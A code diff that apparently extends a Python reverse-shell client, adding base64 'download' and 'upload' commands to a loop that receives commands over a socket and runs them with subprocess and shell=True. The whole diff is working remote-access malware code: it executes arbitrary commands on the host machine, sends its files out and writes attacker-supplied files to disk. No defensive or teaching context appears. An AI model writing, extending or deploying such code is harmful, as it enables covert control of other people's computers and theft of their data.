@@ -3,6 +3,7 @@
 import os
 import sys
 import json
+import base64
 import socket
 import subprocess
 from time import sleep
@@ -27,6 +28,7 @@ def s_recv():
 def shell():
     while True:
         command = s_recv()
+        print(command)
         if command == "q":
             break
         elif command[:2] =="cd" and len(command) > 1:
@@ -34,6 +36,18 @@ def shell():
                 os.chdir(command[3:])
             except:
                 continue
+        elif command[:8] == "download":
+            try:
+                with open(command[9:], "rb") as fout:
+                    s_send(base64.b64encode(fout.read()))
+            except:
+                print(colored("Download Failed !!!", "red"))
+        elif command[:6] == "upload":
+            with open(command[7:], "wb") as fin:
+                file_data = s_recv()
+                print(type(file_data))
+                print(file_data)
+                fin.write(base64.b64decode(file_data))
         else:
             proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
             result = proc.stdout.read() + proc.stderr.read()
